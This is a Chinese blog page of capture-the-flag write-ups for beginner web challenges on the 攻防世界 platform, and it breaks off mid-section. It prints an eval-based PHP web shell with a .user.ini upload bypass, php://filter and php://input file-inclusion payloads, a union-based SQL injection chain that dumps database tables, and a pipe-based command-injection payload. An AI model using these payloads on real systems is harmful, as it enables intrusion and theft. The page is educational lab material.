<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>攻防世界 | linlimei</title><meta name="author" content="linlimei"><meta name="copyright" content="linlimei"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="easyupload题目信息：  解题过程：上传正常的jpg图片，成功上传 上传含有php的一句话木马的php文件，失败 将php文件后缀名改成jpg后再上传，失败 将php文件内容的开头加上GIF89a,再上传，失败 改写php文件中的一句话木马，过滤掉php字眼，如下： 12GIF89a&lt;?&#x3D;eval($_POST[&#x27;cmd&#x27;]);?&gt;  一样没用 上传.use">
<meta property="og:type" content="article">
<meta property="og:title" content="攻防世界">
<meta property="og:url" content="https://linlimei.top/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E6%96%B0%E6%89%8B-%E5%BC%95%E5%AF%BC%E6%A8%A1%E5%BC%8F/cyberpeace_easy/index.html">
<meta property="og:site_name" content="linlimei">
<meta property="og:description" content="easyupload题目信息：  解题过程：上传正常的jpg图片，成功上传 上传含有php的一句话木马的php文件，失败 将php文件后缀名改成jpg后再上传，失败 将php文件内容的开头加上GIF89a,再上传，失败 改写php文件中的一句话木马，过滤掉php字眼，如下： 12GIF89a&lt;?&#x3D;eval($_POST[&#x27;cmd&#x27;]);?&gt;  一样没用 上传.use">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/IMG_20231116_150737.jpg">
<meta property="article:published_time" content="2023-12-23T14:07:17.480Z">
<meta property="article:modified_time" content="2024-03-30T14:09:02.939Z">
<meta property="article:author" content="linlimei">
<meta property="article:tag" content="攻防世界">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/IMG_20231116_150737.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://linlimei.top/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E6%96%B0%E6%89%8B-%E5%BC%95%E5%AF%BC%E6%A8%A1%E5%BC%8F/cyberpeace_easy/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '攻防世界',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-03-30 22:09:02'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/IMG_20231116_150737.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="linlimei"><span class="site-name">linlimei</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">攻防世界</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-23T14:07:17.480Z" title="发表于 2023-12-23 22:07:17">2023-12-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-30T14:09:02.939Z" title="更新于 2024-03-30 22:09:02">2024-03-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E6%96%B0%E6%89%8B-%E5%BC%95%E5%AF%BC%E6%A8%A1%E5%BC%8F/">新手/引导模式</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="攻防世界"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="easyupload"><a href="#easyupload" class="headerlink" title="easyupload"></a>easyupload</h1><h2 id="题目信息："><a href="#题目信息：" class="headerlink" title="题目信息："></a>题目信息：</h2><p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231223212510173.png" alt="image-20231223212510173"></p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231223214319511.png" alt="image-20231223214319511"></p>
<h2 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h2><p>上传正常的jpg图片，成功上传</p>
<p>上传含有php的一句话木马的php文件，失败</p>
<p>将php文件后缀名改成jpg后再上传，失败</p>
<p>将php文件内容的开头加上GIF89a,再上传，失败</p>
<p>改写php文件中的一句话木马，过滤掉php字眼，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>一样没用</p>
<p>上传.user.ini文件，将content-type后的内容改成image&#x2F;jpg，上传成功</p>
<p>.user.ini的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line">auto_prepend_file=eval.jpg//将eval.jpg包含在php.ini配置文件里</span><br></pre></td></tr></table></figure>

<p>后再上传修改了后缀名的php文件，上传成功</p>
<p>利用f12（网络那一栏）来查看路径</p>
<p>使用蚁剑连接，就可以找到flag了</p>
<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
<li><p>图片上传getshell要考虑绕过的点</p>
<ul>
<li>文件名后缀</li>
<li>文件内容添加图片格式的文件头</li>
<li>文件内容php字符串的绕过</li>
<li>修改上传时的content-type信息，改为image&#x2F;jpg</li>
</ul>
</li>
<li><p>.user.ini的使用</p>
<p>在服务器中，只要是运用了fastcgi服务器的都可以用这种方式getshell</p>
<p>这个文件是php.ini的补充文件，当页面访问的时候就可以自动查看当前目录下是否有.user.ini，然后将其补充至php.ini，并作为cgi的启动项</p>
</li>
</ul>
<h1 id="fileinclude"><a href="#fileinclude" class="headerlink" title="fileinclude"></a>fileinclude</h1><h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231224000332955.png" alt="image-20231224000332955"></p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231224000353532.png" alt="image-20231224000353532"></p>
<h2 id="解题过程：-1"><a href="#解题过程：-1" class="headerlink" title="解题过程："></a>解题过程：</h2><p>查看源代码：</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231224000529777.png" alt="image-20231224000529777"></p>
<p>分析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( !ini_get(&#x27;display_errors&#x27;) ) &#123;</span><br><span class="line">  ini_set(&#x27;display_errors&#x27;, &#x27;On&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">$lan = $_COOKIE[&#x27;language&#x27;];//lan 的值可以通过cookie中的laguage值来操控</span><br><span class="line">if(!$lan)</span><br><span class="line">&#123;</span><br><span class="line">	@setcookie(&quot;language&quot;,&quot;english&quot;);</span><br><span class="line">	@include(&quot;english.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	@include($lan.&quot;.php&quot;);//包含了一个变量lan,与.phplian&#x27;ji</span><br><span class="line">&#125;</span><br><span class="line">$x=file_get_contents(&#x27;index.php&#x27;);</span><br><span class="line">echo $x;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>题目说flag在flag.php里面</p>
<p>所以可以将lan值设为flag,在这里要使用<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cainiao-chuanqi/p/15818547.html">伪协议</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag</span><br></pre></td></tr></table></figure>

<p>使用bp的repeater模块发送出去</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231224001816724.png" alt="image-20231224001816724"></p>
<p>得到的base64编码进行解码</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231224001831652.png" alt="image-20231224001831652"></p>
<h2 id="知识点：-1"><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h2><ul>
<li><p>php代码审计</p>
</li>
<li><p>伪协议的使用</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/1853528-20191106132336991-1666925658.png" alt="img"></p>
</li>
</ul>
<p>🔗：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cainiao-chuanqi/p/15818547.html">https://www.cnblogs.com/cainiao-chuanqi/p/15818547.html</a></p>
<h1 id="Inget"><a href="#Inget" class="headerlink" title="Inget"></a>Inget</h1><p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231221211134550.png" alt="image-20231221211134550"></p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231221211207823.png" alt="image-20231221211207823"></p>
<p>考点：万能密码</p>
<p>尝试：</p>
<p>?id&#x3D;1’ or 1&#x3D;1#</p>
<p>无回显</p>
<p>再尝试：</p>
<p>?id&#x3D;1’ or 1&#x3D;1–+</p>
<p>有回显</p>
<p>再尝试：</p>
<p>?id&#x3D;1’ or 1&#x3D;1%23</p>
<p>有回显</p>
<p>原因在于<strong>在url里要先将#编码成%23才能有效</strong></p>
<h1 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h1><p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231221195107453.png" alt="image-20231221195107453"></p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231221195220489.png" alt="image-20231221195220489"></p>
<p>查看源代码，并没有什么敏感信息</p>
<p>直接用御剑扫描：</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231221195440436.png" alt="image-20231221195440436"></p>
<p>查看该网址，回显的信息不变</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231221195551469.png" alt="image-20231221195551469"></p>
<p>由于php文件无法通过浏览器看见，而phps是php文件的源代码文件</p>
<p>所以尝试访问phps文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:62641/index.phps</span><br></pre></td></tr></table></figure>

<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231221195846859.png" alt="image-20231221195846859"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&quot;admin&quot;===$_GET[id]) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);//传入参数id的值进行url解码</span><br><span class="line">if($_GET[id] == &quot;admin&quot;)//如果编码后的id值为admin则输出关键信息</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>

<p>由于浏览器会自动进行一次编码，所以我们要对admin进行两次编码</p>
<p><a target="_blank" rel="noopener" href="https://bbs.huaweicloud.com/blogs/363015">不懂点这里</a></p>
<p>我们直接使用bp的decode模块</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231221201710546.png" alt="image-20231221201710546"></p>
<p>成功获得flag</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231221201810960.png" alt="image-20231221201810960"></p>
<h1 id="fileclude"><a href="#fileclude" class="headerlink" title="fileclude"></a>fileclude</h1><h2 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h2><p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231224145955474.png" alt="image-20231224145955474"></p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231224150028865.png" alt="image-20231224150028865"></p>
<p>解题：</p>
<p>代码审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>];</span><br><span class="line">    <span class="variable">$file2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$file1</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$file2</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file2</span>) === <span class="string">&quot;hello ctf&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$file1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>代码中包含两个文件，file1和file2</p>
<p>file1由include函数包含,最终读取flag，所以使用伪协议filter读取</p>
<p>file2由file_get_contents函数包含，并要求返回的值为hello ctf</p>
<ul>
<li>PHP file_get_contents()函数<ul>
<li>定义：file_get_content()函数把<strong>整个文件</strong>读入一个字符串中</li>
<li>注意是将<strong>文件</strong>读入字符串中</li>
</ul>
</li>
</ul>
<p>这里使用了file_get_contents函数，所以不能直接让file2&#x3D;hello ctf,要将它写入file2中</p>
<p>这里使用到了file2&#x3D;php:&#x2F;&#x2F;input,post写入hello ctf,这样hello ctf就被写入到了file2中</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231224152329597.png" alt="image-20231224152329597"></p>
<p>base64解码：</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231224152407820.png" alt="image-20231224152407820"></p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li><p>PHP<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44508748/article/details/108162951?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-108162951-blog-82461043.t5_download_comparev1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-108162951-blog-82461043.t5_download_comparev1&utm_relevant_index=4">伪协议</a>的了解</p>
</li>
<li><p>php:&#x2F;&#x2F;input函数的使用</p>
</li>
<li><p>PHP file_get_contents()函数</p>
<ul>
<li>定义：file_get_content()函数把<strong>整个文件</strong>读入一个字符串中</li>
<li>注意是将<strong>文件</strong>读入字符串中</li>
</ul>
</li>
<li><p>文件包含的常见文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//定义一个变量$file并将其传递给include函数中执行</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">include($file);</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2201_75955146/article/details/133825011?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-133825011-blog-127154789.235%5Ev39%5Epc_relevant_3m_sort_dl_base4&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-133825011-blog-127154789.235%5Ev39%5Epc_relevant_3m_sort_dl_base4&utm_relevant_index=1">参考这里</a></p>
<h1 id="Newscenter"><a href="#Newscenter" class="headerlink" title="Newscenter"></a>Newscenter</h1><h2 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h2><p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231224213556288.png" alt="image-20231224213556288"></p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231224213618873.png" alt="image-20231224213618873"></p>
<h2 id="解题过程：-2"><a href="#解题过程：-2" class="headerlink" title="解题过程："></a>解题过程：</h2><p>利用中间的搜索框，进行sql注入</p>
<p>经过多次测试，发现这是字符型注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and 1=1#	//有回显</span><br><span class="line">&#x27; and 1=2#	//无回显</span><br></pre></td></tr></table></figure>

<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231224214133975.png" alt="image-20231224214133975"></p>
<p>接着一顿联合查询操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27; order by 3# //查询字段数</span><br><span class="line">&#x27; union select 1,2,database()# //爆库</span><br><span class="line">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;news&#x27;#  //爆表</span><br><span class="line">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;secret_table&#x27;#  //爆列</span><br><span class="line">&#x27; union select 1,id,fl4g from secret_table#  //爆数据</span><br></pre></td></tr></table></figure>

<p>最后获得flag</p>
<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>找到注入点</li>
<li>判断是什么类型的sql注入</li>
<li>字符型的注入的测试语句的掌握</li>
</ul>
<h1 id="command-execution"><a href="#command-execution" class="headerlink" title="command execution"></a>command execution</h1><p>题目</p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231225203609649.png" alt="image-20231225203609649"></p>
<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231225203702063.png" alt="image-20231225203702063"></p>
<h2 id="解题过程：-3"><a href="#解题过程：-3" class="headerlink" title="解题过程："></a>解题过程：</h2><p>直接上payload </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|find / -name &quot;flag*&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231225204101245.png" alt="image-20231225204101245"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|cat /home/flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20231225204142758.png" alt="image-20231225204142758"></p>
<h2 id="知识点：-2"><a href="#知识点：-2" class="headerlink" title="知识点："></a>知识点：</h2><ul>
<li>常见的连接符</li>
</ul>
<table>
<thead>
<tr>
<th align="center">符号</th>
<th align="center">示例</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">；</td>
<td align="center">A;B</td>
<td align="center">先执行A，再执行B</td>
</tr>
<tr>
<td align="center">&amp;</td>
<td align="center">A&amp;B</td>
<td align="center">简单拼接，AB之间没有制约关系</td>
</tr>
<tr>
<td align="center">|</td>
<td align="center">A|B</td>
<td align="center">显示B的执行结果</td>
</tr>
<tr>
<td align="center">&amp;&amp;</td>
<td align="center">A&amp;&amp;B</td>
<td align="center">A执行成功，然后才执行B</td>
</tr>
<tr>
<td align="center">||</td>
<td align="center">A||B</td>
<td align="center">A执行失败才会执行B</td>
</tr>
</tbody></table>
<ul>
<li><p>ls 命令是一个常用的用于列出指定目录中的文件和子目录的命令</p>
<ul>
<li><p>要列出<strong>当前目录</strong>下的所有文件和目录，可以执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
</li>
<li><p>要列出<strong>特定目录</strong>下的所有文件和目录，例如&#x2F;ect目录，可以执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /etc</span><br></pre></td></tr></table></figure>
</li>
<li><p>还可以使用不同选项来修改ls命令的行为</p>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc 	//使用长格式显示文件详细信息</span><br></pre></td></tr></table></figure>

<p>以下是ls命令的一些常见选项</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-a：列出所有文件，包括隐藏文件。</span><br><span class="line">-l：使用长格式显示文件详细信息，包括文件权限、所有者、大小、修改日期等。</span><br><span class="line">-h：以人类可读的格式显示文件大小。</span><br><span class="line">-t：按修改时间顺序列出文件和目录，最近修改的排在最前面。</span><br><span class="line">-r：按相反顺序（即最早的先列出）列出文件和目录。</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>cat命令</p>
<p>cat命令是一个常用在Linux操作系统上查看文件内容的命令。</p>
<p>以下是一些常见的 cat 命令选项：</p>
